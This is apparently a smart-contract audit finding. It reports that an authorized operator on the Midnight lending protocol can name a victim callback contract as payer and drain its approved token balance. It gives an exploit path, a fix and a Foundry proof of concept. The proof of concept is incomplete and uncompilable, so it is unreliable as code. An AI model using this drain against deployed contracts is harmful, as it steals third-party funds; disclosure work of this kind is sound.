### Title
Authorized Operator Can Redirect Buy-Offer Payment Obligation to Arbitrary Third-Party Callback Contract - (File: src/ratifiers/EcrecoverRatifier.sol)

### Summary
`EcrecoverRatifier.isRatified` permits any address that is `isAuthorized[maker][signer]` to sign a fully attacker-crafted `Offer`, including an arbitrary `offer.callback`. In `take()`, when `offer.buy == true`, `payer` is set unconditionally to `offer.callback` if it is non-zero, and all `safeTransferFrom` calls pull from that address. An authorized operator can therefore set `offer.callback = victimContract` and drain `victimContract`'s loanToken balance without the maker paying anything.

### Finding Description

**EcrecoverRatifier authorization check (line 44):**

```solidity
require(_signer == offer.maker || IMidnight(MIDNIGHT).isAuthorized(offer.maker, _signer), Unauthorized());
```

This check validates only that the signer is authorized for `offer.maker`. It places no restriction on any field of the `Offer` struct, including `offer.callback`. The full offer — including `offer.callback = victimContract` — is hashed and signed by the attacker. [1](#0-0) 

**`take()` payer derivation (lines 420–422):**

```solidity
address buyerCallback = offer.buy ? offer.callback : takerCallback;
address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender);
```

For a buy offer with `offer.callback = victimContract`, `payer = victimContract`. There is no check that `victimContract` consented to acting as payer for this specific offer. [2](#0-1) 

**Token pull from payer (lines 455–456):**

```solidity
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

Both transfers pull from `victimContract`. The maker's balance is untouched; `victimContract` pays `buyerAssets` in total. [3](#0-2) 

**Callback invocation before the pull (lines 445–453):**

```solidity
if (buyerCallback != address(0)) {
    require(
        IBuyCallback(buyerCallback).onBuy(...) == CALLBACK_SUCCESS,
        WrongBuyCallbackReturnValue()
    );
}
```

`victimContract.onBuy` is called with `buyer = offer.maker` (not `victimContract`). Any callback contract that does not verify `buyer == address(this)` or that it itself initiated the `take` will return `CALLBACK_SUCCESS`, satisfying this check. [4](#0-3) 

**No existing check stops this.** The only ratifier-level check is `isAuthorized[offer.maker][offer.ratifier]` (line 355) and the EcrecoverRatifier's signer check (line 44). Neither constrains `offer.callback`. [5](#0-4) 

**Complete exploit path:**
1. Precondition: `isAuthorized[maker][attacker] = true`; `isAuthorized[maker][EcrecoverRatifier] = true`; `victimContract` has approved `loanToken` to Midnight and returns `CALLBACK_SUCCESS` from `onBuy` without verifying it initiated the call.
2. Attacker constructs `Offer{buy: true, maker: maker, callback: victimContract, ...}` and signs it.
3. Attacker (or anyone) calls `take(offer, ratifierData, units, taker, ...)`.
4. `isRatified` passes because `isAuthorized[maker][attacker] = true`.
5. `payer = victimContract`.
6. `victimContract.onBuy(...)` returns `CALLBACK_SUCCESS`.
7. `safeTransferFrom(loanToken, victimContract, ...)` drains `victimContract` for `buyerAssets`.
8. `maker` receives credit units; `victimContract` loses `buyerAssets`; maker loses nothing.

### Impact Explanation
`victimContract` loses up to its full loanToken balance approved to Midnight. The maker gains credit units without paying. The maker's funds are completely bypassed. Any contract that (a) holds a Midnight loanToken approval and (b) implements `IBuyCallback` returning `CALLBACK_SUCCESS` without an initiator check is a valid victim. [6](#0-5) 

### Likelihood Explanation
Preconditions are realistic: authorized operators (trading bots, bundlers, portfolio managers) are a standard use pattern explicitly described in the protocol comments. [7](#0-6) 
The victim contract class — callback contracts with a standing Midnight approval — is the normal deployment pattern for any protocol integration. The attack is repeatable until `victimContract`'s approval is revoked or its balance is exhausted.

### Recommendation
In `take()`, when `offer.buy == true` and `offer.callback != address(0)`, the payer should be `buyer` (i.e., `offer.maker`), not `offer.callback`. The callback contract should receive assets from the maker and may redistribute them, but it must not be the source of funds. Alternatively, require that `offer.callback == offer.maker` or that the callback contract is the same as the maker when it is used as payer. The core fix is: **do not derive `payer` from `offer.callback`**; instead, always pull from `buyer`/`msg.sender` and let the callback contract handle any internal redistribution after receiving the call. [8](#0-7) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Offer, Market} from "src/interfaces/IMidnight.sol";
import {EcrecoverRatifier} from "src/ratifiers/EcrecoverRatifier.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IBuyCallback} from "src/interfaces/ICallbacks.sol";

// Victim: a legitimate callback contract that approves Midnight and returns CALLBACK_SUCCESS
contract VictimCallback is IBuyCallback {
    address public midnight;
    address public token;
    constructor(address _midnight, address _token) {
        midnight = _midnight;
        token = _token;
        IERC20(_token).approve(_midnight, type(uint256).max);
    }
    function onBuy(bytes32, Market memory, uint256, uint256, uint256, address, bytes memory)
        external returns (bytes32) { return CALLBACK_SUCCESS; }
}

contract PocTest is Test {
    Midnight midnight;
    EcrecoverRatifier ratifier;
    MockERC20 loanToken;
    VictimCallback victim;

    address maker;
    uint256 attackerKey = 0xBEEF;
    address attacker = vm.addr(attackerKey);
    address taker = address(0xTAKER);

    function setUp() public {
        midnight = new Midnight();
        ratifier = new EcrecoverRatifier(address(midnight));
        loanToken = new MockERC20();

        maker = address(0xMAKER);
        victim = new VictimCallback(address(midnight), address(loanToken));

        // Fund victim with loanToken
        loanToken.mint(address(victim), 1_000e18);

        // Maker authorizes EcrecoverRatifier and attacker
        vm.prank(maker);
        midnight.setIsAuthorized(address(ratifier), true, maker);
        vm.prank(maker);
        midnight.setIsAuthorized(attacker, true, maker);

        // Taker has collateral etc. (setup omitted for brevity)
    }

    function testAttackerDrainsVictim() public {
        // Attacker crafts buy offer with callback = victim
        Offer memory offer = Offer({
            market: /* valid market */,
            buy: true,
            maker: maker,
            callback: address(victim),  // <-- attacker sets victim as payer
            ratifier: address(ratifier),
            // ... other fields
        });

        // Attacker signs offer
        bytes memory ratifierData = _signOffer(offer, attackerKey);

        uint256 victimBefore = loanToken.balanceOf(address(victim));

        // Anyone calls take
        midnight.take(offer, ratifierData, units, taker, receiver, address(0), "");

        uint256 victimAfter = loanToken.balanceOf(address(victim));

        // Assert: victim lost buyerAssets, maker lost nothing
        assertLt(victimAfter, victimBefore, "victim was drained");
        assertEq(loanToken.balanceOf(maker), 0, "maker paid nothing");
    }
}
```

**Expected assertions:**
- `victimAfter < victimBefore` by exactly `buyerAssets`
- `maker`'s loanToken balance unchanged at 0
- `maker`'s credit position in the market increased by `units`

### Citations

**File:** src/ratifiers/EcrecoverRatifier.sol (L33-46)
```text
    function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
        require(msg.sender == MIDNIGHT, NotMidnight());
        (Signature memory sig, bytes32 root, uint256 leafIndex, bytes32[] memory proof) =
            abi.decode(ratifierData, (Signature, bytes32, uint256, bytes32[]));
        require(HashLib.isLeaf(root, HashLib.hashOffer(offer), leafIndex, proof), InvalidProof());
        require(!isRootCanceled[offer.maker][root], RootCanceled());
        bytes32 structHash = keccak256(abi.encode(HashLib.offerTreeTypeHash(proof.length), root));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        address _signer = ecrecover(digest, sig.v, sig.r, sig.s);
        require(_signer != address(0), InvalidSignature());
        require(_signer == offer.maker || IMidnight(MIDNIGHT).isAuthorized(offer.maker, _signer), Unauthorized());
        return CALLBACK_SUCCESS;
    }
```

**File:** src/Midnight.sol (L101-110)
```text
/// AUTHORIZATIONS
/// @dev All functions that change the position, consumed and authorization are accessible to the user and to
/// any account that has been authorized. Thus, to scope authorizations one should authorize a smart-contract with
/// scoped behavior.
/// @dev When authorizing a smart-contract, one should consider:
/// - The targets/functions that the account can call. At least Midnight's functions should be considered, but other
/// contracts might re-use Midnight's authorization mapping too (e.g ratifiers and authorizers). In particular,
/// authorized accounts can authorize other accounts on behalf of the user.
/// - Under which conditions the account can return CALLBACK_SUCCESS when its isRatified function is called.
/// @dev updatePosition and liquidate (for liquidatable users) also impact the position and are permissionless.
```

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

**File:** src/Midnight.sol (L420-456)
```text
        address buyerCallback = offer.buy ? offer.callback : takerCallback;
        address sellerCallback = offer.buy ? takerCallback : offer.callback;
        address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender);
        address receiver = offer.buy ? receiverIfTakerIsSeller : offer.receiverIfMakerIsSeller;

        emit EventsLib.Take(
            msg.sender,
            id,
            units,
            taker,
            offer.maker,
            offer.buy,
            offer.group,
            buyerAssets,
            sellerAssets,
            newConsumed,
            buyerPendingFeeIncrease,
            sellerPendingFeeDecrease,
            buyerCreditIncrease,
            sellerCreditDecrease,
            receiver,
            payer
        );

        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/interfaces/ICallbacks.sol (L8-10)
```text
interface IBuyCallback {
    function onBuy(bytes32 id, Market memory market, uint256 buyerAssets, uint256 units, uint256 pendingFeeIncrease, address buyer, bytes memory data) external returns (bytes32);
}
```
